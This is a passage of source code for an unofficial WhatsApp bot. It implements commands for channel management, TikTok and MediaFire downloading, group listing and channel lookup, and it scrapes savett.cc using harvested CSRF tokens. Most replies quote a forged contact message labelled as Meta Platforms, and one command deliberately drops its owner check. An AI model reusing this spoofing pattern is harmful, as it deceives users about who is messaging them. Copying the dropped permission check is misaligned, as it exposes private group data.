      `🔧 Pour des fonctionnalités sur mesure, contactez-le directement.`,
      `💬 Support, collaborations ou idées — il répondra avec plaisir.`,
      ``,
      `> *© ᴍᴀᴅᴇ ʙʏ DOBERTO*`
    ].join('\n');

    // Envoyer le message principal en citant la vCard pour que l'aperçu apparaisse
    await socket.sendMessage(sender, {
      text,
      footer: "👑 CREATOR"
    }, { quoted: shonux });

    // Envoyer aussi la vCard en tant que contact (pour que l'utilisateur puisse l'ajouter facilement)
    try {
      await socket.sendMessage(sender, {
        contacts: {
          displayName: ownerDisplay,
          contacts: [{ vcard }]
        }
      }, { quoted: msg });
    } catch (e) {
      // Si l'envoi en "contacts" échoue, on ignore silencieusement (l'aperçu a déjà été envoyé)
      console.error('[OWNER] Envoi vCard direct échoué:', e);
    }

  } catch (err) {
    console.error('owner command error:', err);
    try { await socket.sendMessage(sender, { text: '❌ Failed to show owner info.' }, { quoted: msg }); } catch(e){}
  }
  break;
}
        case 'unfollow': {
  const jid = args[0] ? args[0].trim() : null;
  if (!jid) {
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'BaseBot MD';

    const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_UNFOLLOW" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    return await socket.sendMessage(sender, { text: '❗ Provide channel JID to unfollow. Example:\n.unfollow 120363396379901844@newsletter' }, { quoted: shonux });
  }

  const admins = await loadAdminsFromMongo();
  const normalizedAdmins = admins.map(a => (a || '').toString());
  const senderIdSimple = (nowsender || '').includes('@') ? nowsender.split('@')[0] : (nowsender || '');
  const isAdmin = normalizedAdmins.includes(nowsender) || normalizedAdmins.includes(senderNumber) || normalizedAdmins.includes(senderIdSimple);
  if (!(isOwner || isAdmin)) {
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'BaseBot MD';
    const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_UNFOLLOW2" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };
    return await socket.sendMessage(sender, { text: '❌ Permission denied. Only owner or admins can remove channels.' }, { quoted: shonux });
  }

  if (!jid.endsWith('@newsletter')) {
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'BaseBot MD';
    const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_UNFOLLOW3" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };
    return await socket.sendMessage(sender, { text: '❗ Invalid JID. Must end with @newsletter' }, { quoted: shonux });
  }

  try {
    if (typeof socket.newsletterUnfollow === 'function') {
      await socket.newsletterUnfollow(jid);
    }
    await removeNewsletterFromMongo(jid);

    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'BaseBot MD';
    const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_UNFOLLOW4" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    await socket.sendMessage(sender, { text: `✅ Unfollowed and removed from DB: ${jid}` }, { quoted: shonux });
  } catch (e) {
    console.error('unfollow error', e);
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'Doberto XD';
    const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_UNFOLLOW5" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };
    await socket.sendMessage(sender, { text: `❌ Failed to unfollow: ${e.message || e}` }, { quoted: shonux });
  }
  break;
}
case 'tiktok': {
  try {
    // Définir jid et sender
    const jid = msg.key.remoteJid;
    const sender = msg.key.participant || msg.key.remoteJid;
    
    // headers adaptés au site savett.cc
    const headers = {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Origin': 'https://savett.cc',
      'Referer': 'https://savett.cc/en1/download',
      'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    };

    // helpers encapsulés
    async function getCsrfAndCookie() {
      const res = await axios.get('https://savett.cc/en1/download', { 
        headers,
        timeout: 10000 
      });
      const csrf = res.data.match(/name="csrf_token" value="([^"]+)"/)?.[1] || null;
      const cookie = (res.headers['set-cookie'] || [])
        .map(v => v.split(';')[0])
        .join('; ');
      return { csrf, cookie };
    }

    async function postDl(url, csrf, cookie) {
      const body = `csrf_token=${encodeURIComponent(csrf)}&url=${encodeURIComponent(url)}`;
      const res = await axios.post('https://savett.cc/en1/download', body, {
        headers: { ...headers, Cookie: cookie },
        timeout: 30000
      });
      return res.data;
    }

    function parseSavettHtml(html) {
      const $ = cheerio.load(html);
      const stats = [];
      $('#video-info .my-1 span').each((_, el) => stats.push($(el).text().trim()));

      const data = {
        username: $('#video-info h3').first().text().trim() || null,
        views: stats[0] || null,
        likes: stats[1] || null,
        bookmarks: stats[2] || null,
        comments: stats[3] || null,
        shares: stats[4] || null,
        duration: $('#video-info p.text-muted').first().text().replace(/Duration:/i, '').trim() || null,
        type: null,
        downloads: { nowm: [], wm: [] },
        mp3: [],
        slides: []
      };

      const slides = $('.carousel-item[data-data]');
      if (slides.length) {
        data.type = 'photo';
        slides.each((_, el) => {
          try {
            const json = JSON.parse($(el).attr('data-data').replace(/&quot;/g, '"'));
            if (Array.isArray(json.URL)) {
              json.URL.forEach(url => data.slides.push({ index: data.slides.length + 1, url }));
            }
          } catch {}
        });
        return data;
      }

      data.type = 'video';
      $('#formatselect option').each((_, el) => {
        const label = $(el).text().toLowerCase();
        const raw = $(el).attr('value');
        if (!raw) return;
        try {
          const json = JSON.parse(raw.replace(/&quot;/g, '"'));
          if (!json.URL) return;
          if (label.includes('mp4') && !label.includes('watermark')) data.downloads.nowm.push(...json.URL);
          if (label.includes('watermark')) data.downloads.wm.push(...json.URL);
          if (label.includes('mp3')) data.mp3.push(...json.URL);
        } catch {}
      });

      return data;
    }

    async function savett(url) {
      const { csrf, cookie } = await getCsrfAndCookie();
      if (!csrf) throw new Error('CSRF token not found');
      const html = await postDl(url, csrf, cookie);
      return parseSavettHtml(html);
    }

    // helper pour télécharger une URL en Buffer avec limite de taille
    async function fetchBufferFromUrl(u) {
      try {
        // Vérifier l'espace disque disponible
        const stats = await fs.promises.stat('/').catch(() => ({ size: 0 }));
        const freeSpace = stats.size || 1024 * 1024 * 1024; // fallback 1GB
        
        // Limiter à 50MB par fichier
        const response = await axios({
          method: 'GET',
          url: u,
          responseType: 'stream',
          timeout: 30000,
          maxContentLength: 50 * 1024 * 1024, // 50MB max
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
          }
        });

        const chunks = [];
        let totalSize = 0;
        
        for await (const chunk of response.data) {
          chunks.push(chunk);
          totalSize += chunk.length;
          
          // Vérifier la taille totale
          if (totalSize > 50 * 1024 * 1024) {
            throw new Error('Fichier trop volumineux (>50MB)');
          }
        }
        
        return Buffer.concat(chunks);
      } catch (e) {
        console.error('[TIKTOK] fetchBufferFromUrl error', e?.message || e);
        return null;
      }
    }

    // validation URL
    const url = (args[0] || '').trim();
    if (!url || !/^https?:\/\//i.test(url)) {
      await socket.sendMessage(sender, { 
        text: '❗ Usage: .tiktok <url>\nExample: .tiktok https://vt.tiktok.com/xxxxx' 
      }, { quoted: msg });
      break;
    }

    // Réaction d'attente
    await socket.sendMessage(jid, { react: { text: "⏳", key: msg.key } });
    await socket.sendMessage(sender, { 
      text: '🔎 Recherche et téléchargement en cours, merci de patienter...' 
    }, { quoted: msg });

    // exécution principale
    const info = await savett(url);

    if (!info) {
      await socket.sendMessage(sender, { 
        text: '❌ Impossible de récupérer les informations pour ce lien.' 
      }, { quoted: msg });
      await socket.sendMessage(jid, { react: { text: "❌", key: msg.key } });
      break;
    }

    // résumé
    const summary = [
      `👤 Auteur: ${info.username || 'inconnu'}`,
      `🎞️ Type: ${info.type || 'inconnu'}`,
      `🖼️ Slides: ${info.slides?.length || 0}`,
      `🎵 Audio: ${info.mp3?.length || 0}`,
      `📥 Vidéos (no watermark): ${info.downloads.nowm?.length || 0}`,
      `💧 Vidéos (watermark): ${info.downloads.wm?.length || 0}`
    ];
    if (info.duration) summary.push(`⏱️ Durée: ${info.duration}`);
    
    await socket.sendMessage(sender, { 
      text: `✅ Résultat:\n${summary.join('\n')}` 
    }, { quoted: msg });

    // Fonction pour envoyer avec gestion d'erreur
    async function sendMediaWithRetry(mediaType, buffer, caption, maxRetries = 2) {
      for (let i = 0; i < maxRetries; i++) {
        try {
          const messageOptions = { quoted: msg };
          if (mediaType === 'video') {
            await socket.sendMessage(jid, { video: buffer, caption, mimetype: 'video/mp4' }, messageOptions);
          } else if (mediaType === 'audio') {
            await socket.sendMessage(jid, { audio: buffer, mimetype: 'audio/mpeg', fileName: 'audio.mp3' }, messageOptions);
          } else if (mediaType === 'image') {
            await socket.sendMessage(jid, { image: buffer, caption }, messageOptions);
          }
          return true;
        } catch (sendErr) {
          console.error(`[TIKTOK] Send attempt ${i + 1} failed:`, sendErr.message);
          if (i === maxRetries - 1) throw sendErr;
          await new Promise(r => setTimeout(r, 1000));
        }
      }
      return false;
    }

    let mediaSent = false;

    // priorité: envoyer les vidéos sans watermark si disponibles
    if (Array.isArray(info.downloads.nowm) && info.downloads.nowm.length) {
      const toSend = info.downloads.nowm.slice(0, 1); // limiter à 1 pour éviter les problèmes
      for (const v of toSend) {
        const buf = await fetchBufferFromUrl(v);
        if (!buf) {
          await socket.sendMessage(sender, { text: `⚠️ Impossible de télécharger la vidéo` }, { quoted: msg });
          continue;
        }
        const sent = await sendMediaWithRetry('video', buf, `🎥 TikTok — ${info.username || 'Auteur'}`);
        if (sent) mediaSent = true;
      }
    }

    // sinon envoyer vidéos watermark si présentes
    if (!mediaSent && Array.isArray(info.downloads.wm) && info.downloads.wm.length) {
      const toSend = info.downloads.wm.slice(0, 1);
      for (const v of toSend) {
        const buf = await fetchBufferFromUrl(v);
        if (!buf) {
          await socket.sendMessage(sender, { text: `⚠️ Impossible de télécharger la vidéo` }, { quoted: msg });
          continue;
        }
        const sent = await sendMediaWithRetry('video', buf, `🎥 TikTok (watermark) — ${info.username || 'Auteur'}`);
        if (sent) mediaSent = true;
      }
    }

    // si mp3 disponible
    if (!mediaSent && Array.isArray(info.mp3) && info.mp3.length) {
      for (const a of info.mp3.slice(0, 1)) {
        const buf = await fetchBufferFromUrl(a);
        if (!buf) {
          await socket.sendMessage(sender, { text: `⚠️ Impossible de télécharger l'audio` }, { quoted: msg });
          continue;
        }
        const sent = await sendMediaWithRetry('audio', buf, '');
        if (sent) mediaSent = true;
      }
    }

    // slides (photos)
    if (!mediaSent && Array.isArray(info.slides) && info.slides.length) {
      for (const s of info.slides.slice(0, 3)) {
        const buf = await fetchBufferFromUrl(s.url);
        if (!buf) {
          await socket.sendMessage(sender, { text: `⚠️ Impossible de télécharger l'image` }, { quoted: msg });
          continue;
        }
        const sent = await sendMediaWithRetry('image', buf, `🖼️ Slide ${s.index} — ${info.username || 'Auteur'}`);
        if (sent) mediaSent = true;
      }
    }

    // Réaction finale
    if (mediaSent) {
      await socket.sendMessage(jid, { react: { text: "✅", key: msg.key } });
    } else {
      await socket.sendMessage(sender, { text: '❌ Aucun média exploitable trouvé pour ce lien.' }, { quoted: msg });
      await socket.sendMessage(jid, { react: { text: "❌", key: msg.key } });
    }

  } catch (err) {
    console.error('[TIKTOK COMMAND ERROR]', err);
    
    // Définir jid et sender pour le catch
    const jid = msg?.key?.remoteJid;
    const sender = msg?.key?.participant || msg?.key?.remoteJid;
    
    try { 
      await socket.sendMessage(jid, { react: { text: '❌', key: msg.key } }); 
    } catch(e){}
    
    let errorMessage = err.message || 'Erreur inconnue';
    if (errorMessage.includes('ENOSPC')) {
      errorMessage = 'Espace disque insuffisant pour traiter ce média. Essayez avec un fichier plus petit.';
    } else if (errorMessage.includes('timeout')) {
      errorMessage = 'Délai d\'attente dépassé. Le serveur met trop de temps à répondre.';
    }
    
    await socket.sendMessage(sender, { 
      text: `❌ Erreur lors du traitement: ${errorMessage}` 
    }, { quoted: msg });
  }
  break;
}

case 'groupjid': {
  try {
    // ✅ Owner check removed — now everyone can use it!

    await socket.sendMessage(sender, { 
      react: { text: "📝", key: msg.key } 
    });

    await socket.sendMessage(sender, { 
      text: "📝 Fetching group list..." 
    }, { quoted: msg });

    const groups = await socket.groupFetchAllParticipating();
    const groupArray = Object.values(groups);

    // Sort by creation time (oldest to newest)
    groupArray.sort((a, b) => a.creation - b.creation);

    if (groupArray.length === 0) {
      return await socket.sendMessage(sender, { 
        text: "❌ No groups found!" 
      }, { quoted: msg });
    }

    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || BOT_NAME_FANCY || "CHMA MD";

    // ✅ Pagination setup — 10 groups per message
    const groupsPerPage = 10;
    const totalPages = Math.ceil(groupArray.length / groupsPerPage);

    for (let page = 0; page < totalPages; page++) {
      const start = page * groupsPerPage;
      const end = start + groupsPerPage;
      const pageGroups = groupArray.slice(start, end);

      // ✅ Build message for this page
      const groupList = pageGroups.map((group, index) => {
        const globalIndex = start + index + 1;
        const memberCount = group.participants ? group.participants.length : 'N/A';
        const subject = group.subject || 'Unnamed Group';
        const jid = group.id;
        return `*${globalIndex}. ${subject}*\n👥 Members: ${memberCount}\n🆔 ${jid}`;
      }).join('\n\n');

      const textMsg = `📝 *Group List - ${botName}*\n\n📄 Page ${page + 1}/${totalPages}\n👥 Total Groups: ${groupArray.length}\n\n${groupList}`;

      await socket.sendMessage(sender, {
        text: textMsg,
        footer: `🤖 Powered by ${botName}`
      });

      // Add short delay to avoid spam
      if (page < totalPages - 1) {
        await delay(1000);
      }
    }

  } catch (err) {
    console.error('GJID command error:', err);
    await socket.sendMessage(sender, { 
      text: "❌ Failed to fetch group list. Please try again later." 
    }, { quoted: msg });
  }
  break;
}





case 'mediafire': {
    try {
        const text = (msg.message.conversation || msg.message.extendedTextMessage?.text || '').trim();
        const url = text.split(" ")[1]; // .mediafire <link>

        // ✅ Load bot name dynamically
        const sanitized = (number || '').replace(/[^0-9]/g, '');
        let cfg = await loadUserConfigFromMongo(sanitized) || {};
        let botName = cfg.botName || 'BASEBOT MD';

        // ✅ Fake Meta contact message (like Facebook style)
        const shonux = {
            key: {
                remoteJid: "status@broadcast",
                participant: "0@s.whatsapp.net",
                fromMe: false,
                id: "META_AI_FAKE_ID_MEDIAFIRE"
            },
            message: {
                contactMessage: {
                    displayName: botName,
                    vcard: `BEGIN:VCARD
VERSION:3.0
N:${botName};;;;
FN:${botName}
ORG:Meta Platforms
TEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002
END:VCARD`
                }
            }
        };

        if (!url) {
            return await socket.sendMessage(sender, {
                text: '🚫 *Please send a MediaFire link.*\n\nExample: .mediafire <url>'
            }, { quoted: shonux });
        }

        // ⏳ Notify start
        await socket.sendMessage(sender, { react: { text: '📥', key: msg.key } });
        await socket.sendMessage(sender, { text: '*⏳ Fetching MediaFire file info...*' }, { quoted: shonux });

        // 🔹 Call API
        let api = `https://tharuzz-ofc-apis.vercel.app/api/download/mediafire?url=${encodeURIComponent(url)}`;
        let { data } = await axios.get(api);

        if (!data.success || !data.result) {
            return await socket.sendMessage(sender, { text: '❌ *Failed to fetch MediaFire file.*' }, { quoted: shonux });
        }

        const result = data.result;
        const title = result.title || result.filename;
        const filename = result.filename;
        const fileSize = result.size;
        const downloadUrl = result.url;

        const caption = `📦 *${title}*\n\n` +
                        `📁 *Filename:* ${filename}\n` +
                        `📏 *Size:* ${fileSize}\n` +
                        `🌐 *From:* ${result.from}\n` +
                        `📅 *Date:* ${result.date}\n` +
                        `🕑 *Time:* ${result.time}\n\n` +
                        `✅ Downloaded by BASEBOT-MD`;

        // 🔹 Send file automatically (document type for .zip etc.)
        await socket.sendMessage(sender, {
            document: { url: downloadUrl },
            fileName: filename,
            mimetype: 'application/octet-stream',
            caption: caption
        }, { quoted: shonux });

    } catch (err) {
        console.error("Error in MediaFire downloader:", err);

        // ✅ In catch also send Meta mention style
        const sanitized = (number || '').replace(/[^0-9]/g, '');
        let cfg = await loadUserConfigFromMongo(sanitized) || {};
        let botName = cfg.botName || 'BaseBot MD';

        const shonux = {
            key: {
                remoteJid: "status@broadcast",
                participant: "0@s.whatsapp.net",
                fromMe: false,
                id: "META_AI_FAKE_ID_MEDIAFIRE"
            },
            message: {
                contactMessage: {
                    displayName: botName,
                    vcard: `BEGIN:VCARD
VERSION:3.0
N:${botName};;;;
FN:${botName}
ORG:Meta Platforms
TEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002
END:VCARD`
                }
            }
        };

        await socket.sendMessage(sender, { text: '*❌ Internal Error. Please try again later.*' }, { quoted: shonux });
    }
    break;
}


// ---------------- list saved newsletters (show emojis) ----------------
case 'ownerlist': {
  try {
    const docs = await listNewslettersFromMongo();
    if (!docs || docs.length === 0) {
      let userCfg = {};
      try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
      const title = userCfg.botName || 'BaseBot MD';
      const shonux = {
          key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_NEWSLIST" },
          message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
      };
      return await socket.sendMessage(sender, { text: '📭 No channels saved in DB.' }, { quoted: shonux });
    }

    let txt = '*📚 Saved Newsletter Channels:*\n\n';
    for (const d of docs) {
      txt += `• ${d.jid}\n  Emojis: ${Array.isArray(d.emojis) && d.emojis.length ? d.emojis.join(' ') : '(default)'}\n\n`;
    }

    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'BaseBot MD';
    const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_NEWSLIST2" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    await socket.sendMessage(sender, { text: txt }, { quoted: shonux });
  } catch (e) {
    console.error('newslist error', e);
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'Doberto XD';
    const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_NEWSLIST3" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };
    await socket.sendMessage(sender, { text: '❌ Failed to list channels.' }, { quoted: shonux });
  }
  break;
}



case 'cid': {
  try {
    // --- Extraire la requête depuis le message (supporte plusieurs types)
    const q = msg.message?.conversation
      || msg.message?.extendedTextMessage?.text
      || msg.message?.imageMessage?.caption
      || msg.message?.videoMessage?.caption
      || '';

    // --- sanitized session id (cohérence)
    const sanitized = String(number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || 'Doberto XD';

    // --- fausse vCard pour les réponses citées
    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_FAKE_ID_CID"
      },
      message: {
        contactMessage: {
          displayName: botName,
          vcard: `BEGIN:VCARD
VERSION:3.0
N:${botName};;;;
FN:${botName}
ORG:Meta Platforms
TEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002
END:VCARD`
        }
      }
    };

    // --- Extraire le lien depuis la commande ou le texte (supporte .cid <link> ou texte contenant le lien)
    let channelLink = (args && args.length) ? args.join(' ').trim() : q.replace(/^[.\/!]cid\s*/i, '').trim();
    if (!channelLink) {
      const urlMatch = q.match(/https?:\/\/[^\s]+/i);
      if (urlMatch) channelLink = urlMatch[0];
    }

    if (!channelLink) {
      return await socket.sendMessage(sender, {
        text: '❎ Veuillez fournir un lien de Channel WhatsApp.\n\n📌 Exemple : .cid '
      }, { quoted: shonux });
    }

    // --- Normaliser et valider le lien
    const match = channelLink.match(/(?:https?:\/\/)?(?:www\.)?whatsapp\.com\/channel\/([\w-]+)/i);
    if (!match) {
      return await socket.sendMessage(sender, {
        text: '⚠️ Format de lien invalide.\nAssurez‑vous qu’il ressemble à :\n'
      }, { quoted: shonux });
    }
    const inviteId = match[1];

    // --- Cache mémoire simple pour éviter appels répétés (TTL 10 minutes)
    if (!global.__whatsapp_channel_cache) global.__whatsapp_channel_cache = new Map();
    const cacheKey = `channel_${inviteId}`;
    const cached = global.__whatsapp_channel_cache.get(cacheKey);
    const now = Date.now();
    if (cached && (now - cached._ts) < (10 * 60 * 1000)) {
      const metadata = cached.metadata;
      if (process.env.LOG_LEVEL === 'debug') console.debug('[CID] renvoi depuis le cache pour', inviteId);
      const infoTextCached = buildChannelInfoText(metadata, botName);
      // Envoi interactif depuis le cache
      const previewUrlCached = normalizePreviewUrl(metadata.preview);
      const interactiveCached = {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: infoTextCached },
              footer: { text: `© ${botName}` },
              header: previewUrlCached ? { imageMessage: { url: previewUrlCached } } : { title: "Channel Info" },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "cta_copy",
                    buttonParamsJson: JSON.stringify({
                      display_text: "📋 Copier l'ID",
                      id: "copy_id",
                      copy_code: metadata.id
                    })
                  }
                ]
              }
            }
          }
        }
      };
      try {
        await socket.relayMessage(sender, interactiveCached.viewOnceMessage.message, { messageId: `cid_${inviteId}_${Date.now()}` });
      } catch (e) {
        // fallback texte si relay échoue
        await socket.sendMessage(sender, { text: infoTextCached }, { quoted: shonux });
      }
      break;
    }

    // --- Indiquer que l'on récupère les infos
    await socket.sendMessage(sender, { text: `🔎 Récupération des informations du channel : *${inviteId}*` }, { quoted: shonux });

    // --- Wrapper timeout pour appels asynchrones
    const withTimeout = (p, ms = 15000) => Promise.race([p, new Promise((_, rej) => setTimeout(() => rej(new Error('timeout')), ms))]);

    // --- Récupérer les métadonnées via l'API Baileys si disponible
    let metadata = null;
    try {
      if (typeof socket.newsletterMetadata === 'function') {
        metadata = await withTimeout(socket.newsletterMetadata("invite", inviteId), 15000);
      } else if (typeof socket.getNewsletterMetadata === 'function') {
        metadata = await withTimeout(socket.getNewsletterMetadata(inviteId), 15000);
      } else {
        throw new Error('newsletterMetadata non disponible sur le socket');
      }
    } catch (errMeta) {
      console.warn('[CID] échec récupération metadata', errMeta?.message || errMeta);
      metadata = null;
    }

    if (!metadata || !metadata.id) {
      return await socket.sendMessage(sender, {
        text: '❌ Channel introuvable ou inaccessible. Il peut être privé ou l’API ne fournit pas ses métadonnées.'
      }, { quoted: shonux });
    }

    const normalized = {
      id: metadata.id || inviteId,
      name: metadata.name || metadata.title || null,
      subscribers: (typeof metadata.subscribers === 'number') ? metadata.subscribers : (metadata.subscriberCount || metadata.followers || null),
      creation_time: metadata.creation_time || metadata.createdAt || metadata.created_at || null,
      preview: metadata.preview || metadata.thumbnail || metadata.image || null,
      description: metadata.description || metadata.about || null,
      category: metadata.category || null,
      owner: metadata.owner || metadata.creator || null
    };

    // --- Persister dans le cache mémoire
    global.__whatsapp_channel_cache.set(cacheKey, { metadata: normalized, _ts: Date.now() });

    // --- Construire le texte d'information
    function buildChannelInfoText(md, botNameLocal) {
      const lines = [];
      lines.push('📡 *Informations du WhatsApp Channel*');
      lines.push('');
      lines.push(`🆔 *ID:* ${md.id}`);
      if (md.name) lines.push(`📌 *Nom:* ${md.name}`);
      if (md.subscribers !== null && md.subscribers !== undefined) lines.push(`👥 *Abonnés:* ${Number(md.subscribers).toLocaleString()}`);
      if (md.creation_time) {
        try {
          const ts = Number(md.creation_time);
          const dateStr = isNaN(ts) ? String(md.creation_time) : new Date(ts * 1000).toLocaleString();
          lines.push(`📅 *Créé le:* ${dateStr}`);
        } catch { lines.push(`📅 *Créé le:* ${md.creation_time}`); }
      }
      if (md.category) lines.push(`🏷️ *Catégorie:* ${md.category}`);
      if (md.owner) lines.push(`👤 *Propriétaire:* ${md.owner}`);
      if (md.description) lines.push('');
      if (md.description) lines.push(`📝 ${md.description}`);
      lines.push('');
      lines.push(`_© Propulsé par ${botNameLocal}_`);
      return lines.join('\n');
    }

    function normalizePreviewUrl(preview) {
      if (!preview) return null;
      if (preview.startsWith('http')) return preview;
      return `https://pps.whatsapp.net${preview}`;
    }

    const infoText = buildChannelInfoText(normalized, botName);
    const previewUrl = normalizePreviewUrl(normalized.preview);

    // --- Construire le message interactif avec bouton "copy"
    const interactive = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: infoText },
            footer: { text: `© ${botName}` },
            header: previewUrl ? { imageMessage: { url: previewUrl } } : { title: "Channel Info" },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_copy",
                  buttonParamsJson: JSON.stringify({
                    display_text: "📋 Copier l'ID",
                    id: "copy_id",
                    copy_code: normalized.id
                  })
                }
              ]
            }
          }
        }
      }
    };

    // --- Envoyer le message interactif (relay) ; fallback sur texte si échec
    try {
      await socket.relayMessage(sender, interactive.viewOnceMessage.message, { messageId: `cid_${inviteId}_${Date.now()}` });
    } catch (errRelay) {
      console.warn('[CID] relay interactive failed, fallback to text', errRelay?.message || errRelay);
      if (previewUrl) {
        try {
          await socket.sendMessage(sender, { image: { url: previewUrl }, caption: infoText }, { quoted: shonux });
        } catch (e) {
          await socket.sendMessage(sender, { text: infoText }, { quoted: shonux });
        }
      } else {
        await socket.sendMessage(sender, { text: infoText }, { quoted: shonux });
      }
    }

  } catch (err) {
    console.error("Erreur commande CID :", err);
    try {
      await socket.sendMessage(sender, {
        text: '⚠️ Une erreur inattendue est survenue lors de la récupération des informations du channel. Veuillez réessayer plus tard.'
      }, { quoted: shonux });
    } catch (e) { /* ignore */ }
  }
  break;
}

case 'addadmin': {
  if (!args || args.length === 0) {
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'Doberto XD';

    const shonux = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_FAKE_ID_ADDADMIN" },
        message: { contactMessage: { displayName: title, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    return await socket.sendMessage(sender, { text: '❗ Provide a jid or number to add as admin\nExample: .addadmin 9477xxxxxxx' }, { quoted: shonux });
  }

  const jidOr = args[0].trim();
  if (!isOwner) {
    let userCfg = {};
    try { if (number && typeof loadUserConfigFromMongo === 'function') userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {}; } catch(e){ userCfg = {}; }
    const title = userCfg.botName || 'BaseBot MD';

    const shonux = {
